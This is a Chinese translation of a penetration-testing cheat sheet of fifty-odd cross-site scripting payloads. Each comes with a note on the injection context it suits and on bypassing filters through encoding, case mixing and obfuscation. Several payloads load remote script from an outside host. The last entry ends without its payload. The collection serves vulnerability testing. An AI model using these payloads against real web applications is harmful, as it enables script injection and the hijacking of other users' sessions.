# XSS_Cheat_Sheet_2020_Edition

## 简介
白帽赏金平台 | xss漏洞模糊测试有效载荷的最佳集合 2020版 <br>
该备忘清单可用于漏洞猎人，安全分析，渗透测试人员，根据应用的实际情况测试不同的payload，并观察响应内容，查找web应用的跨站点脚本漏洞，共计xxx条xss漏洞测试小技巧 <br>
本备忘录翻译自国外的XSS_Cheat_Sheet_2020_Edition.pdf议题，源文件可在本项目内直接下载 <br>
翻译整理不易，少侠，留个小星星再走吧 (ฅ>ω<*ฅ)～

## 摘要
**1.基本** <br>
**2.高级** <br>
**3.绕过** <br>
**4.利用** <br>
**5.额外** <br>
**6.枚举** <br>

## 内容
**1.HTML Injection （代码注入）** <br>
当输入的payload，被插入到HTML标签或外部标签的属性值内时，则使用下面的方法进行测试，如果输入的内容被插入到了HTML注释，则在payload之前添加"->"
```
<svg onload=alert(1)>
"><svg onload=alert(1)>
```
**2.HTML Injection – Tag Block Breakout（HTML注入–标签闭合）** <br>
当输入的payload，被插入到以下标签的内部时，使用以下标签：<br>
`<title> <style> <script> <textarea> <noscript> <pre> <xmp> <iframe>` （`</tag>`为相应的html标签）。
```
</tag><svg onload=alert(1)>
"></tag><svg onload=alert(1)>
```
**3.HTML Injection - Inline （HTML注入-内联标签）** <br>
当输入的payload，被插入到HTML标签的属性值内，但该标签不能以大于号（>）进行闭合。<br>
```
"onmouseover=alert(1) //
"autofocus onfocus=alert(1) //
```
**4.HTML Injection - Source（HTML注入-源）** <br>
当输入的payload，被作为以下HTML标签属性的值使用时：`href`，`src`，`data`或`action`。payload中的`src`属性值可以是一个URL或者`"data:,alert(1)"`。
```
javascript:alert(1)
```
**5.Javascript Injection (javascript注入)** <br>
当输入的payload，被插入到javascript标签块中的字符串定界值中时使用。
```
'-alert(1)-'
'/alert(1)//
```
**6.Javascript Injection - Escape Bypass (javascript注入-绕过)** <br>
当输入的payload，被插入到javascript标签块字符串定界值中，但具有单引号，可以尝试使用反斜杠注释进行绕过。
```
\'/alert(1)//
```
**7.Javascript Injection – Script Breakout (javascript注入-脚本突破)** <br>
当输入的payload，被插入到javascript标签块中的任何位置时使用。
```
</script><svg onload=alert(1)>
```
**8.Javascript Injection - Logical Block (javscript注入-逻辑代码块)** <br>
当输入的payload，被插入到javascript标签块时，使用第一个或第二个payload，该值如果位于字符串分隔值或在单个逻辑代码块（如函数或条件（if，else，等等中）。 如果需要引用转义反斜杠，请使用第3个payload。
```
'}alert(1);{'
'}alert(1)%0A{'
\'}alert(1);{//
```
**9.Javascript Injection - Quoteless (javscript注入-无变量名)** <br>

当输入的payload在同一行javascript代码中有多次反射时使用。<br>
第一个payload适用于简单的javascript变量，第二个payload适用于非嵌套的javascript对象。 <br>
```
/alert(1)//\
/alert(1)}//\
```
**10.Javascript Context - Placeholder Injection in Template Literal (javascript注入-模板文字中的占位符注入)** <br>
当输入的payload被插入到反引号```（``）```分隔的字符串内或模板引擎中时使用。<br>
```
${alert(1)}
```
**11.Multi Reflection HTML Injection - Double Reflection (Single Input) (HTML注入多重反射-双重反射（单输入）)** <br>
payload用于利用同一页面上的多次反射。<br>
```
'onload=alert(1)><svg/1='
'>alert(1)</script><script/1='
*/alert(1)</script><script>/*
```
**12.Multi Reflection i HTML Injection - Triple Reflection (Single Input) (HTML注入多重反射-三次反射（单输入）)** <br>
payload用于利用同一页面上的多次反射。<br>
```
*/alert(1)">'onload="/*<svg/1='
`-alert(1)">'onload="`<svg/1='
*/</script>'>alert(1)/*<script/1='
```
**13.Multi Input Reflections HTML Injection - Double & Triple (HTML注入多输入反射-两次和三次)** <br>
payload用于利用同一页面上的多个输入反射。在HPP（HTTP参数污染）其中存在重复参数的反射。 第三个payload利用相同参数的逗号分隔进行反射。<br>
```
p=<svg/1='&q='onload=alert(1)>
p=<svg 1='&q='onload='/*&r=*/alert(1)'>
q=<script/&q=/src=data:&q=alert(1)>
```
**14.File Upload Injection – Filename (文件上传注入-文件名)** <br>
payload用于用户上传的文件名返回在目标页面的某处时使用。
```
"><svg onload=alert(1)>.gif
```
**15.File Upload Injection – Metadata (文件上传注入-元数据)** <br>
payload用于，当上传文件的元数据返回在目标页面中的某处时使用。 它可以使用命令行exiftool（"$"是终端提示），并且可以设置任何元数据字段。
```
$ exiftool -Artist='"><svg onload=alert(1)>' xss.jpeg
```
**16.File Upload Injection – SVG File (文件上传注入-SVG文件)** <br>
上传图像文件时，用于在目标上创建存储的XSS payload。 将以下内容另存为"xss.svg"文件 <br>
```
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
```
**17.DOM Insert Injection (DOM 注入)** <br>
当注入的payload作为有效标记插入DOM中，而不是反映在源代码中时，用于测试XSS。<br>
它适用于html标签和其他payload无效的情况下使用。<br>
```
<img src=1 onerror=alert(1)>
<iframe src=javascript:alert(1)>
<details open ontoggle=alert(1)>
<svg><svg onload=alert(1)>
```
**18.DOM Insert Injection – Resource Request (DOM 注入-资源请求)** <br>
当网站调用本地的javascript代码发送请求，并且将请求的结果插入到页面中时，如果攻击者可以控制该URL。则可以使用以下payload进行测试 <br>
```
data:text/html,<img src=1 onerror=alert(1)>
data:text/html,<iframe src=javascript:alert(1)>
```
**19.PHP Self URL Injection (PHP self URL注入)** <br>
当网站服务器端PHP代码，将当前URL当作HTML表单属性值进行获取。payload在斜杠（/）在php扩展名和查询部分的开始（？）之间插入。<br>
```
https://brutelogic.com.br/xss.php/"><svg onload=alert(1)>?a=reader
```
**20.Markdown Vector (Markdown 组件测试)**  <br>
在网站允许某些markdown标记，比如：输入的文本框，注释部分等中使用payload。点击触发。<br>
```
[clickme](javascript:alert`1`)
```
**21.Script Injection - No Closing Tag (脚本注入-没有结束标记)** <br>
payload在反射后的javascript代码中有结束脚本标签（</script>）时使用。 <br>
```
<script src=data:,alert(1)>
<script src=//brutelogic.com.br/1.js>
```
**22.Javascript postMessage() DOM Injection (with Iframe) (Javascript postMessage() DOM注入（带有Iframe）)** <br>
在JavaScript代码中有"message"事件监听器(如"window.addEventListener('message',...)")时使用该payload，并且服务器端没有检查来源。 如果能够对目标进行请求伪造（根据http请求 X-Frame Options标头）。 则另存一个HTML文件（或者使用data:text/html，以提供TARGET_URL和INJECTION（xss payload）进行测试。<br>
```
<iframe src=TARGET_URL onload="frames[0].postMessage('INJECTION','*')">
```
**23.XML-Based XSS (基于XML的XSS)** <br>
该payload用于在XML页面(内容类型为text/xml或application/xml）中进行测试。如果输入点位于注释部分，则在payload前添加"->"；如果输入位于CDATA部分，则将"->"添加payload。<br>
```
<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script>
<x:script xmlns:x="http://www.w3.org/1999/xhtml" src="//brutelogic.com.br/1.js"/>
```
**24.AngularJS Injections (v1.6 and up) (AngularJS注入(v1.6及更高版本))。** <br>
第一个payload用于在页面中，带有ng-app指令的HTML块中进行测试。<br>
第二个payload用于创建自己的AngularJS库时使用。<br>
```
{{$new.constructor('alert(1)')()}}
<x ng-app>{{$new.constructor('alert(1)')()}}
```
**25.Onscroll Universal Vector (通用Onscroll事件 测试payload)** <br>
使用onscroll事件处理web应用时，用户无需交互即可触发XSS漏洞。它与address, blockquote, body, center, dir, div, dl, dt, form, li, menu, ol, p, pre, ul,和h1到h6 HTML标签一起使用。 <br>
```
<p style=overflow:auto;font-size:999px onscroll=alert(1)>AAA<x/id=y></p>#y
```
**26.Type Juggling (类型戏法)** <br>
该payload用于在web应用不够严格对比匹配数字的"if"条件中使用。<br>
```
1<svg onload=alert(1)>
1"><svg onload=alert(1)>
```
**27.XSS in SSI (SSI中的XSS漏洞)** <br>
该payload在服务器端包含（SSI）注入时使用。<br>
```
<<!--%23set var="x" value="svg onload=alert(1)"--><!--%23echo var="x"-->>
```
**28.SQLi Error-Based XSS (基于sql显注的XSS)** <br>
该payload在可以触发SQL错误消息（带引号或反斜杠）的功能点中进行测试。<br>
```
'1<svg onload=alert(1)>
<svg onload=alert(1)>\
```
**29.Injection in JSP Path (JSP路径中的xss注入)** <br>
该payload可以在基于JSP的程序，测试应用的路径中使用。<br>
```
//DOMAIN/PATH/;<svg onload=alert(1)>
//DOMAIN/PATH/;"><svg onload=alert(1)>
```
**30.JS Injection - ReferenceError Fix (javascript注入-修复ReferenceError错误)** <br>
该payload用于修复一些javascript代码的语法。 通过查看浏览器开发人员工具（F12）中的"控制台"选项卡，是否有相应的ReferenceError，并相应地替换变量和函数名称进行测试。<br>
```
';alert(1);var myObj='
';alert(1);function myFunc(){}'
```
**31.Bootstrap Vector (up to v3.4.0) (Bootstrap最新版xss测试)** <br>
该payload用于web应用调用bootstrap库时进行测试。 href值的任何char都可以进行HTML编码，只需单击页面中的任意位置即可触发，并且绕过Webkit Auditor过滤器。 <br>
```
<html data-toggle=tab href="<img src=x onerror=alert(1)>">
```
**32.Browser Notification (浏览器通知)** <br>
以下payload用作alert()，prompt()和confirm()函数的替代方法。 如果用户已经触发第一个payload，就可以使用第二个payload进行测试。<br>
```
Notification.requestPermission(x=>{new(Notification)(1)})
new(Notification)(1)
```
**33.XSS in HTTP Header - Cached (HTTP请求头中-缓存xss)** <br>
该payload用于使用MISS-MISS-HIT缓存方案（如果服务器端开启）在应用程序中测试存储XSS。 将XSS标签替换为相应的payload，并将TARGET替换为虚拟字符串， 触发相同的请求3次，以避免页面的实际缓存信息。<br>
```
$ curl -H "Vulnerable_Header: <XSS>" TARGET/?dummy_string
```
**34.Mixed Case（大小写混合）** <br>
该payload用于绕过区分大小写的xss过滤器。<br>
```
<Svg OnLoad=alert(1)>
<Script>alert(1)</Script>
```
**35.Unclosed Tags（未闭合标签）** <br>
该payload在HTML注入中使用，可避免同时存在小于`（<）`和大于`（>）`符号的情况。<br>
```
<svg onload=alert(1)//
<svg onload="alert(1)"
```
**36.Uppercase XSS (大写 XSS)** <br>
当web应用以大写形式返回用户的输入时使用该payload。 URL中将"＆"替换为"％26"，将"＃"替换为"％23"。<br>
```
<SVG ONLOAD=&#97&#108&#101&#114&#116(1)>
<SCRIPT SRC=//BRUTELOGIC.COM.BR/1></SCRIPT>
```
**37.Extra Content for Script Tags (脚本标签的额外内容)** <br>
当web应用过滤器查找带有某些变体的`"<script>"`或`"<script src = ..."`但不检查其他属性时使用该payload。<br>
```
<script/x>alert(1)</script>  
```
**38.Double Encoded XSS (双重编码的XSS)** <br>
当web应用程序对用户输入的内容执行双重解码时使用该payload。<br>
```
%253Csvg%2520o%256Eload%253Dalert%25281%2529%253E
%2522%253E%253Csvg%2520o%256Eload%253Dalert%25281%2529%253E
```
**39.Alert without Parentheses (Strings Only) (没有括号的弹窗（仅字符串）)** <br>
当web应用不允许使用括号并且常规的alert可以使用时，可在HTML向量或javascript注入payload进行使用。 <br>
```
alert`1`
```
**40.Alert without Parentheses (不带括号的弹窗)** <br>
当web应用不允许使用括号并且PoC需要返回任意目标信息时，可在HTML标签或javascript注入该payload中使用。 <br>
```
setTimeout`alert\x28document.domain\x29`
setInterval`alert\x28document.domain\x29`
```
**41.Alert without Parentheses – HTML Entities (不带括号的弹窗– HTML实体)** <br>
当前的payload只能在HTML代码注入中使用，当web应用不允许使用括号时。 在URL中将"＆"替换为"％26"，将"＃"替换为"％23"。 <br>
```
<svg onload=alert&lpar;1&rpar;>
<svg onload=alert&#40;1&#41>
```
**42.Alert without Alphabetic Chars (不带字母字符的弹窗)** <br>
当前web应用不允许使用字母字符时使用该payload。以下是`alert(1)`的payload <br>
```
[]['\146\151\154\164\145\162']['\143\157\156\163\164\162\165\143\164\157\162']
('\141\154\145\162\164\50\61\51')()
```
**43.Alert Obfuscation (弹窗混淆)** <br>
以下payload用于欺骗基于正则表达式（regex）的过滤器。 可以将其与以前的绕过方法结合使用。 根据上下文，最短的选项"top"也可以替换为"window"，"parent"，"self"或者"this" <br>
```
(alert)(1)
a=alert,a(1)
[1].find(alert)
top["al"+"ert"](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
top['al\145rt'](1)
top[8680439..toString(30)](1)
```
**44.Alert Alternative – Write & Writeln (弹窗代替方案-Write & Writeln)** <br>
以下payload用作弹窗函数:`alert`，`prompt`,`confirm`的替代方法。 如果在HTML标签块中则可以直接使用，但如果是javascript注入，则需要完整的"document.write"形式。 URL中将"＆"替换为"％26"，将"＃"替换为"％23"。 可以用writeln代替Write。 <br>
```
write`XSSed!`
write`<img/src/o&#78error=alert&lpar;1)&gt;`
write('\74img/src/o\156error\75alert\501\51\76')
```
**45.Alert Alternative – Open Pseudo-Protocol (弹窗代替方案-使用伪协议打开)** <br>
以下payload用作弹窗函数:`alert`，`prompt`,`confirm`的替代方法。 以上技巧也适用于此。 但只有第二个payload可以在基于Chromium的浏览器中触发，并且需要`<iframe name = 0>`。<br>
```
top.open`javas\cript:al\ert\x281\x29`
top.open`javas\cript:al\ert\x281\x29${0}0`
```
**46.Alert Alternative - Eval + URL (弹窗代替方案-eval+url)** <br>
以下payload用作弹窗函数:`alert`，`prompt`,`confirm`的替代方法。第一个payload是原始形式，第二个payload是eval，它使用payload的id属性值替换eval。<br> URL必须采用以下方式:在PHP扩展后的URL路径中或URL的片段中。 加号（+）必须用URL进行编码。<br>
```
<svg onload=eval(" ' "+URL)>
<svg id=eval onload=top[id](" ' "+URL)>
```
PoC URL必须包含以下之一： <br>
```
=> FILE.php/'/alert(1)//?...
=> #'/alert(1)
```
**47.Alert Alternative - Eval + URL with Template Literal (弹窗代替方案-带有模板文字的Eval + URL)** <br>
```
${alert(1)}<svg onload=eval('`//'+URL)>
```
**48.HTML Injection - Inline Alternative (HTML注入-内联替代)** <br>
以下payload用于绕过黑名单。<br>
```
"onpointerover=alert(1) //
"autofocus onfocusin=alert(1) //
```
**49.Strip-Tags Based Bypass (基于去除标签的绕过)** <br>
以下payload用于,当过滤器filter去掉<and>标签字符之间的任何内容时进行测试，如PHP的`strip_tags()`功能,但仅限内联注入 <br>
```
"o<x>nmouseover=alert<x>(1)//
"autof<x>ocus o<x>nfocus=alert<x>(1)//
```
**50.File Upload Injection – HTML/js GIF Disguise (文件上传注入- HTML/js GIF伪装)** <br>
以下payload用于通过文件上传绕过CSP限制。将下面的所有内容保存为"xss.gif"或"xss.js"（用于严格的MIME检查）。这是PHP的image/gif文件,它可以通过`<link rel=import href=xss.gif>`（也称为"xss.js"）或`<script src=xss.js></script>`导入到目标web应用。<br>


## 致谢
**英文议题作者：** <br>
@brutelogic <br>
<br>
**中文翻译团队：**<br>
@farmsec <br>
@farmsec_alice <br>
@farmsec_lancet <br>
@farmsec_answer <br>

